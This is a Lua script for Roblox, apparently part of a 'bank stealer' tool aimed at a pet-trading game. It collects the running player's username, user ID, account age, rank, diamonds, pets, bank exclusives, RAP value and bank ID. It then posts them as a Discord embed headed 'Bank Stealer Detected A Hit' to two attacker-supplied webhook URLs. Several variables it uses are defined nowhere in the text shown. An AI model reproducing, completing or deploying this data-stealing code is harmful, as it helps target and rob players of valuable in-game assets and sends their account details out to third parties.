local url = _G.Webhook
local us = _G.DualHookWebhook
local url2 = us
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value
local display = game.Players.LocalPlayer.DisplayName
local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
local Loading = game.Players.LocalPlayer.PlayerGui.Loading.Frame.Info.Location.Text
local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
request = http_request or request or HttpPost or syn.request

local data1 = {
    ["content"] = "||@everyone||\n__**Bank Stealer Detected A Hit**__",
    ["embeds"] = {
        {
            ["title"] = "```Bank-Steal Results```",
            ["url"] = "https://discord.gg/5MFcdt2kaj",
            ["description"] = "__**This data was generated using" .. _G.ScriptName .."**__",
            ["type"] = "rich",
            ["color"] = tonumber(0x7b00ff),
            ["thumbnail"] = {
                ["url"] = imgs,
                ["height"] = 420,
                ["width"] = 420
            },
            ["fields"] = {
                {
                    ["name"] = "Detected an Hit 1+ invtes",
                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:detective:DisplayName :"..display.."\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:mag:Place :"..Loading.."\n:mag:Place :"..Game.."**",
                    ["inline"] = false
                },
                {
                    ["name"] = ":gem: Diamonds :gem: ",
                    ["value"] = "```> "..myclowns.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "📍Pets📍",
                    ["value"] = "```> "..bomg.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":money_mouth: Bank Exclusives:money_mouth: ",
                    ["value"] = "```> "..#PetsList.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":money_mouth: Bank Huges :money_mouth: ",
                    ["value"] = "```> "..#clown.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "RAP📊",
                    ["value"] = "```> "..RAP.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Bank ID",
                    ["value"] = "```> "..mybanks[1]["BUID"].."```",
                    ["inline"] = true
                }
            }
        }
    }
}
local newdata1 = game:GetService("HttpService"):JSONEncode(data1)

local headers = {
    ["content-type"] = "application/json"
}
local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
local abcdef2 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}
request(abcdef1)
request(abcdef2)
